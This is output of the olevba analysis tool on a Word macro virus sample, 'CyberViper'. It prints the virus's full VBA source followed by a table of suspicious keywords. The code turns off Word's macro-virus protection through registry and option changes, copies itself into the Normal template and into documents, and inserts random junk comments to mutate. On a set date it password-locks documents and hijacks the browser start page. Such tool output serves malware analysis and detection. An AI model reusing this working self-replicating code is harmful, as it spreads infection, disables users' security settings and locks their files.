olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CViper-012e7741d7a57a6eee2ca203b1ced8738584037f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CViper-012e7741d7a57a6eee2ca203b1ced8738584037f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberViper.bas 
in file: Virus.MSWord.CViper-012e7741d7a57a6eee2ca203b1ced8738584037f - OLE stream: 'Macros/VBA/CyberViper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'@¡ä^PÏ9‘™šª
Sub AutoOpen()
'pWåÀ«s²WgvÜ8¡e4E/v

'×v§„†|fpU+Pã,nh�?~S�Œ?
Rem      Macro.Word97.CyberViper
Rem Copyright by Wit AKA CyberViper 1999
Rem     ( My first macro virus )
Rem       ( Stealth, Polimorf )
'4*�ßMeÒ

On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
With System
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
End With
'C•¨5¢³¼v0ƒ’+r7=^æ˜Vs~,{wÝVB…d†oS- h�Ðt–
With Options
 .VirusProtection = (((1 * 1) - 1) / 10)
 .SaveNormalPrompt = (((1 * 1) - 1) / 10)
 .ConfirmConversions = (((1 * 1) - 1) / 10)
End With
TmpFileName = "c:\CV.sys"
'~ uY¶ÒÄC5">kEãÎ”±=S%Å¼¾bz�À�HIh’d‰u’*�Ià
Call CyberMutate
'3•AÙ3xVÎ¶V¦S1&
If ThisDocument = NormalTemplate Then
  For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
'5ç§#“44¿X)[l\ÝãpW@@¡rr
  Next I
    NormalTemplate.VBProject.VBComponents("CyberViper").Export (TmpFileName)
'e ´ÈW¬pÂ
'Œ‹�1®S+Wàa¡hiaJJt›P©•˜/(>Qo”YÇÓ‰m
    ActiveDocument.VBProject.VBComponents.Import TmpFileName
    ActiveDocument.Saved = False
Else
'plIÏ>p™�±8`!¼Ø[MÞEsh`ã“‰:Ó&¾
  For I = 1 To NormalTemplate.VBProject.VBComponents.Count
'¸”™U…¾Ë2Œs.z«ƒqÝä–Š›1DX#>t��¼(q+^˜‡—aÕº“
        If NormalTemplate.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
'¯ÓLgŽgH“�;,žÇ tEƒâ¹l€�¦'¡Ód7uºgrµ
'[O€Rd(€IÌ•¶ÙbŒ0žrà6Øœe=Kæ:%e�Ø‹
'—¹®©¸S�…‘Xsfâ‡”}&k;¢>Gk3›
'O–¬U““æÚQÂ¹q�‚ƒ
  Next I
'À¦ÕÏs8Þ¿«p#A@…q5W ÉƒEÓj`ºKyOÏšjmÌ•Ú‡bÍS
    Application.VBE.ActiveVBProject.VBComponents("CyberViper").Export (TmpFileName)
    NormalTemplate.VBProject.VBComponents.Import TmpFileName
'ižCv?âV+À®R¾ÎäV|Ö
    NormalTemplate.Saved = False
    NormalTemplate.Save
'5=<
'„äy»]/Ï“ÌÁ¹Ø*ÄMV*ÔåT‹dJH9˜•Ë1Hž|YÆ]âo¾Á
End If
EndFind:
'ar>›3Iª„
'vÇK²ÓKäáÎˆ¢{? šÊi*…*jz[á"¢šŠ%¯^äZh
'‰V”I/Ó6¢ÔNÝÉx‚¹Æ
Kill TmpFileName
'Å¦°çcƒr«CtŒÂŒu…M›�¨Ñj\Z>‰L”hÏF¨µš
If Month(Now()) = 4 And Day(Now()) = 15 Then
 ActiveDocument.Password = "-=CyberViper=-"
'@+P·Þe¨¾'¾€I˜ÕÝ¢"¤à!Þ.Z”Á(*�^r
'…BW1ãX›]Ê_¿B\.‚z—&_;a¸�àÅŽ™FÔ
 ActiveDocument.Saved = False
'�ªÖÆ
'É-:àÆÄçO¤�
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "file://C:\CV.HTM"
 Open "c:\CV.HTM" For Output As #1
'7B)®Š
 Print #1, "<HTML><HEAD></HEAD><script LANGUAGE=" + Chr(34) + "JavaScript1.2" + Chr(34) + ">"
 Print #1, "a=1;setInterval(" + Chr(34) + "J()" + Chr(34) + ",10);function J(){a=a+.1;"
'œ¡TWÅÄ•åÖM«ä
 Print #1, "self.moveBy((Math.random()*a*2 -a),(Math.random()*a*2)-a);}</script></BODY></HTML>"
'z`.q’¸”¢Ás¿°ª²Fº-QÞÃKDOÙSS®¤º·
 Close #1
End If
End Sub
Sub FileTemplates()
'·p|‚
 Application.EnableCancelKey = wdCancelDisabled
 Options.VirusProtection = (((1 * 1) - 1) / 10)
'}µ¶oÔµ1ž®
 Options.ConfirmConversions = (((1 * 1) - 1) / 10)
End Sub
'•¤”+È+>_wtË+ÓO*
Sub ToolsMacro()
 Call FileTemplates
End Sub
Sub ViewVBCode()
Call FileTemplates
End Sub
Sub AutoClose()
 Call AutoOpen
End Sub
Sub AutoNew()
 Call AutoOpen
End Sub
Sub FileSaveAs()
'tc¬J(Ñ({³·ÄI}ÍÅr|e
 Call AutoOpen
'Ü}°oN˜Ž|¡¹
'žIE”0{ÕT½kY×ž�
'“Y\º"¸Â­)rÌ¾jàÎ+Ýhˆ¹*–
 Dialogs(wdDialogFileSaveAs).Show
End Sub
'/rc®^¿>–ßPÛ6äž—Ô’Q
Sub FileSave()
';(ªÈ‡Àäˆ-�a
 Call AutoOpen
 ActiveDocument.Save
';¥
End Sub
'ÁHß-,¾k
'‡·À
Sub CyberMutate()
Call ClearRem
For C2 = 1 To 50
  U2 = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
  M1 = Int((U2 * Rnd) + 1)
  F4 = Int((40 * Rnd) + 1)
  CRem = "'"
'nÄU§
  For C3 = 1 To F4
'w·Q
   CRem = CRem + Chr(Int((200 * Rnd) + 32))
  Next C3
  ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.InsertLines M1, CRem
Next C2
End Sub
Sub ClearRem()
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
'Ð’tÃ±Ó>º¥ÖÆ»»~³�@^}ÒÍ
For UU = 1 To UUEnd
'ÇqÁåSBª#cª65Zo�^[Á]kpÈq°£qÞ¡‡L”µ{ÔX¥ÒXi"
'…n5¼{¶—Æ#J.5b9 ‹£ŒÅ0F§zg=¬Ù
 If Mid(ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.Lines(UU, 1), 1, 1) = "'" Then
   ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.DeleteLines UU
'‚âKkoX„;‡á�Õ£xª,·¬ƒ?La
'+Ï@Q™i‰×�ß¸p·’y)'
   UU = UU - 1
 End If
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
Next UU
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

